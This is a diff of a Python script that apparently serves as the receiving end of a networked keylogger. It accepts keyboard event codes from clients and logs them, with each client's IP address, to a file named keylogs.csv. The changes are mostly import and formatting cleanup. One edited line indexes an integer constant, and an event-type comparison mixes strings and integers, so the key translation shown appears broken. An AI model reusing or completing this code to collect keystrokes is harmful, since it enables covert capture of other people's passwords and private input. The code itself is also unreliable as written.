@@ -1,20 +1,15 @@
-#!/bin/python
+#!/bin/python3
 
 from evdev import ecodes
-from os import getenv
 from socketserver import *
-from select import select
-from threading import Thread, current_thread
-import logging
-import threading
+from threading import Thread
 from datetime import datetime
 
-import socket
 import pandas as pd
-import time
+
 
 def log_csv(ip_cli, ipt):
-    filename='keylogs.csv'
+    filename = 'keylogs.csv'
 
     if not ip_cli:
         return
@@ -28,10 +23,11 @@ def log_csv(ip_cli, ipt):
     finally:
         df.to_csv(filename)
 
+
 def translate_event(data):
     (ev_type, ev_code, _) = tuple(data.split(',')[:-1])
-    if (ev_type == ecodes.EV_KEY):
-        return f"{ecodes.KEY[ev_code]}"
+    if ev_type == ecodes.EV_KEY:
+        return f"{ecodes.EV_KEY[ev_code]}"
     else:
         return None
 
@@ -77,4 +73,3 @@ if __name__ == '__main__':
             server.serve_forever()
         except KeyboardInterrupt:
             server.shutdown()
-
